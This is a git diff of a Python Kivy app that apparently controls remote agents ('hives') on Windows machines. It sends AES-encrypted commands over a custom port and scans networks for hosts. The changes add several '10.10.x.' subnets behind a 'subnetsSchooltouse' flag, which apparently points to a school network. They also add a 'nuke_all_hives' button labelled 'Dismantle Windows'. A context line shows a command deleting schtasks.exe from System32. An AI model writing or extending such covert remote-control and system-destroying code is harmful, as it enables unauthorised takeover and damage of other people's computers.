@@ -139,6 +139,7 @@ from kivy.core.window import Window
 Window.softinput_mode = 'below_target'
 
 selfdestructbuttonpresses = 0
+nuketbuttonpresses = 0
 
 # Get the current screen resolution
 screen_width, screen_height = Window.size
@@ -257,7 +258,7 @@ def send(connection, todo, mode='vary'): # switched to diversify to use the diff
                 try:
                     server=serverip
                     if mode == 'diversify':
-                        port = 45433
+                        port = 45102
                     else:
                         port=3451
                     
@@ -274,9 +275,9 @@ def send(connection, todo, mode='vary'): # switched to diversify to use the diff
                     return False
                 
                 if mode == 'diversify':
-                    TUTKEYPHONE = b'\x12\x1f\xb7\x1b\x7f\xe8W0\xa7\xc7\x04\xad\xc5\x03Q\xa1\x93\xd7\xab3\xe9\xbfE\xcf)=w\xd1\x97N\x9e\xae'
+                    TUTKEYPHONE =  "placeholder"
                 else:
-                    TUTKEYPHONE = b'G\xc5!\xae\xfeU\xf7h\xb5}\t\x11U\x8c\x98\x06\x18q]K\xeb\x87\x83\xb0\xb8\x89_\xb8\xda\n\xcc\x03'
+                    TUTKEYPHONE =  "placeholder"
                 
                 def encrypt(key, plaintext):
                     cipher = AES.new(key, AES.MODE_EAX)
@@ -532,7 +533,7 @@ def scan_network(self):
 
 def check_if_diversify_host_responds(objectr='None', ip = 'None'):
     # host_ips = []
-    diversifyportSL = 45433 
+    diversifyportSL = 45102 
 
     def scan_ip(ip):
         socket.setdefaulttimeout(0.7)
@@ -1053,7 +1054,7 @@ for i in range(threads_count_to):
         content.background_color = (0.8, 0, 0, 1)
 
         # add the content Label widget to the content BoxLayout
-        #content_layout.add_widget(content)
+        # content_layout.add_widget(content)
 
         # create the Popup widget with the BoxLayout as its content
         popup = Popup(title='Error', title_color=(1, 0, 0, 0.7), content=content, background_color=(1, 0, 0, 1), title_align='center', title_size=(screen_width*0.08), separator_color=(1,0,0,1), pos_hint={'center_x':0.5,'center_y':0.6}, size_hint=(None, None), size=((screen_width*0.60, screen_height*0.35)))
@@ -1090,7 +1091,7 @@ for i in range(threads_count_to):
         host_ips_found = []
         for i in showndevicesforscandiversify:
             removeDevice(i)
-        diversifyportSL = 45433 
+        diversifyportSL = 45102 
         def anT():
             global host_ips_found
             def get_subnet(): 
@@ -1118,6 +1119,12 @@ for i in range(threads_count_to):
             if subnetsSchooltouse:
                 subnets.append('10.10.144.')
                 subnets.append('10.10.1.')
+                subnets.append('10.10.59.')
+                subnets.append('10.10.100.')
+                subnets.append('10.10.245.')
+                subnets.append('10.10.191.')
+                subnets.append('10.10.14.')
+                
             
             subnets = list(set(subnets)) # to remove duplicates
             subnets = list(filter(None, subnets))
@@ -1154,7 +1161,7 @@ for i in range(threads_count_to):
     #     host_ips_found = []
     #     for i in showndevicesforscandiversify:
     #         removeDevice(i)
-    #     diversifyportSL = 45433 
+    #     diversifyportSL = 45102 
     #     def anT():
     #         global host_ips_found
     #         def get_subnet(): 
@@ -1638,6 +1645,19 @@ programVL2('del "C:\\Windows\\System32\\schtasks.exe"')
             Clock.schedule_once(lambda dt: vary().showpopup_message(f'You need to press self destruct {5-selfdestructbuttonpresses} more times to confirm', "Self destruct"))
             selfdestructbuttonpresses += 1
 
+    def nuke_all_hives(placeholder):
+        global nuketbuttonpresses
+        if nuketbuttonpresses > 3:
+            nuketbuttonpresses = 0
+            send(placeholder, f'nuke_all_hives', mode='diversify')
+            Clock.schedule_once(lambda dt: vary().showpopup("Dismantling begins.", True), 0) 
+        else:
+            # Clock.schedule_once(lambda dt: self.showpopup_message('The scan for hosts was not able to identify any hosts', "Scanner"), 0)
+            # you need to press self destruct to confirm x more times
+            Clock.schedule_once(lambda dt: vary().showpopup_message(f'You need to press {5-nuketbuttonpresses} more times to confirm', "Dismantle Windows"))
+            nuketbuttonpresses += 1
+
+
     def diversifyalwaysontop(placeholder):
         send(placeholder, f'alwaysontop{splitertextdiversified}{placeholder.root.ids.diversifyalwaysontop.text}', mode='diversify')
     
@@ -1650,14 +1670,14 @@ programVL2('del "C:\\Windows\\System32\\schtasks.exe"')
 def main(showerror = False, whatisError = None):
     global amirunning
     
-    if __name__ == "__main__":
-        if amirunning == False:
-            amirunning = True
-            vary().run()
-        else:
-            vary().stop()
-            Builder.unload_file('vary.kv')
-            vary().run()
+    # if __name__ == "__main__":
+    if amirunning == False:
+        amirunning = True
+        vary().run()
+    else:
+        vary().stop()
+        Builder.unload_file('vary.kv')
+        vary().run()
 amirunning = False
 
 #Startup().run()
